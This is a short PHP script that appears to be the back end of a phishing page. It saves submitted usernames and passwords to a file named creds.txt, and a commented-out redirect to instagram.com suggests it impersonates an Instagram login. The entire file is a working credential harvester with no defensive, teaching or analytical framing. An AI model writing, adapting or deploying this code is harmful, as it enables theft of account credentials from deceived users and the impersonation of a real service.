<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["username"];
    $pass = $_POST["password"];
    file_put_contents("creds.txt", $user . ":" . $pass . PHP_EOL, FILE_APPEND);
    //header("Location: https://instagram.com"); // redirect after login
    exit();
}
?>
